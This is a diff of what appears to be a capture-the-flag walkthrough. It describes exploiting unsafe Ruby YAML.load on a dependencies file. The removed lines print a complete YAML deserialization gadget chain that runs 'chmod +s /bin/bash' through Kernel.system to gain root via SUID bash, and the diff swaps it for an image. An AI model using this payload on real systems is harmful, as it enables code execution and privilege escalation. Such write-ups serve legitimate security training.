@@ -173,27 +173,7 @@ end
 
 YAML.load is calling a file called dependiencies.yml. We can create our own dependencies.yml file and get code execution using git_set. I grabbed the base of this code from https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=blog.stratumsecurity.com#file-ruby_yaml_load_sploit2-yaml:
 
-```text
----
-- !ruby/object:Gem::Installer
-    i: x
-- !ruby/object:Gem::SpecFetcher
-    i: y
-- !ruby/object:Gem::Requirement
-  requirements:
-    !ruby/object:Gem::Package::TarReader
-    io: &1 !ruby/object:Net::BufferedIO
-      io: &1 !ruby/object:Gem::Package::TarReader::Entry
-         read: 0
-         header: "abc"
-      debug_output: &1 !ruby/object:Net::WriteAdapter
-         socket: &1 !ruby/object:Gem::RequestSet
-             sets: !ruby/object:Net::WriteAdapter
-                 socket: !ruby/module 'Kernel'
-                 method_id: :system
-             git_set: chmod +s /bin/bash
-         method_id: :resolve
-```
+![yml.png](../assets/precious_assets/yml.png)
 
 Here I'm setting the SUID bit on bash.
 
